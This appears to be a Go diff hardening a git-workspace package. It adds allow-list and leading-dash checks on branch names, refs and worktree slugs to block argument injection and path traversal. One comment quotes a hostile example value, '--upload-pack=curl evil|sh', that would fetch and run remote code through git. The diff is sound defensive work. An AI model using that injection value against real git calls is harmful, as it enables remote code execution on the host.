@@ -3,6 +3,7 @@ package workspace
 import (
 	"bytes"
 	"context"
+	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -180,6 +181,16 @@ func ListCommits(ctx context.Context, cwd string, limit int) (string, []Commit, 
 
 // CreateWorktree creates a new git worktree with branch `slug` under worktreesBaseDir.
 func CreateWorktree(ctx context.Context, repoCwd, worktreesBaseDir, slug, baseRef string) (string, string, error) {
+	// Validate before a single git call: the slug becomes a path component and the ref becomes
+	// a positional argument that git still parses for options.
+	if err := AssertSafeWorktreeSlug(slug); err != nil {
+		return "", "", err
+	}
+	if strings.TrimSpace(baseRef) != "" {
+		if err := AssertSafeGitRef(baseRef, "base ref"); err != nil {
+			return "", "", err
+		}
+	}
 	topLevel, err := runGit(ctx, repoCwd, "rev-parse", "--show-toplevel")
 	if err != nil || topLevel == "" {
 		return "", "", err
@@ -430,6 +441,11 @@ func DiscardChanges(ctx context.Context, cwd string) error {
 
 // SwitchBranch checks out an existing or new git branch.
 func SwitchBranch(ctx context.Context, cwd, branch string, create bool) error {
+	// Client-supplied: `git checkout -- <path>` and `-b`-style options both come from this
+	// position, so a value starting with '-' must never reach git.
+	if err := AssertSafeGitRef(branch, "branch"); err != nil {
+		return err
+	}
 	if create {
 		_, err := runGit(ctx, cwd, "checkout", "-b", branch)
 		return err
@@ -440,6 +456,9 @@ func SwitchBranch(ctx context.Context, cwd, branch string, create bool) error {
 
 // RenameBranch renames the current branch to newName.
 func RenameBranch(ctx context.Context, cwd, newName string) (string, error) {
+	if err := AssertSafeGitRef(newName, "branch name"); err != nil {
+		return "", err
+	}
 	if _, err := runGit(ctx, cwd, "branch", "-m", newName); err != nil {
 		return "", err
 	}
@@ -489,6 +508,9 @@ func Pull(ctx context.Context, cwd string) error {
 
 // Merge runs `git merge <ref>`.
 func Merge(ctx context.Context, cwd, ref string) error {
+	if err := AssertSafeGitRef(ref, "merge ref"); err != nil {
+		return err
+	}
 	if strings.TrimSpace(ref) == "" {
 		ref = "main"
 	}
@@ -581,6 +603,9 @@ func MergeStrategy(ctx context.Context, cwd, ref, strategy string) error {
 	if strings.TrimSpace(ref) == "" {
 		ref = "main"
 	}
+	if err := AssertSafeGitRef(ref, "merge ref"); err != nil {
+		return err
+	}
 	switch strings.ToLower(strings.TrimSpace(strategy)) {
 	case "squash":
 		_, err := runGit(ctx, cwd, "merge", "--squash", ref)
@@ -607,4 +632,50 @@ func RemoveWorktreeFromDisk(ctx context.Context, worktreePath string) error {
 		}
 	}
 	return os.RemoveAll(worktreePath)
+}
+
+// safeGitRefPattern is the same allow-list the node daemon applies before interpolating a
+// user-supplied ref into a git argument list.
+var safeGitRefPattern = regexp.MustCompile(`^[A-Za-z0-9._/-]+$`)
+
+// AssertSafeGitRef rejects a ref that could be read as a git option or reach outside the
+// repository.
+//
+// `git worktree add ... <baseRef>` takes the ref positionally, but git still parses anything
+// starting with `-` as an option: `--upload-pack=curl evil|sh` would execute on fetch, and
+// `-b`-style values can rewrite which branch is created. The pattern plus the `..`/`@{` checks
+// match worktree-session.ts assertSafeGitRef.
+func AssertSafeGitRef(ref, label string) error {
+	trimmed := strings.TrimSpace(ref)
+	if trimmed == "" {
+		return fmt.Errorf("invalid %s: empty", label)
+	}
+	if !safeGitRefPattern.MatchString(trimmed) {
+		return fmt.Errorf("invalid %s: %q contains characters outside [A-Za-z0-9._/-]", label, ref)
+	}
+	if strings.HasPrefix(trimmed, "-") {
+		return fmt.Errorf("invalid %s: %q must not start with '-'", label, ref)
+	}
+	if strings.Contains(trimmed, "..") || strings.Contains(trimmed, "@{") {
+		return fmt.Errorf("invalid %s: %q contains a forbidden sequence", label, ref)
+	}
+	return nil
+}
+
+// AssertSafeWorktreeSlug rejects a slug that would escape the worktrees directory.
+//
+// The slug becomes a path component (`<base>/<repo>/<slug>`), so a value containing a separator
+// or `..` writes outside the byspace-owned tree.
+func AssertSafeWorktreeSlug(slug string) error {
+	trimmed := strings.TrimSpace(slug)
+	if trimmed == "" {
+		return nil // caller substitutes a generated name
+	}
+	if trimmed == "." || trimmed == ".." || strings.ContainsAny(trimmed, "/\\") {
+		return fmt.Errorf("invalid worktree slug: %q", slug)
+	}
+	if strings.HasPrefix(trimmed, "-") {
+		return fmt.Errorf("invalid worktree slug: %q must not start with '-'", slug)
+	}
+	return nil
 }
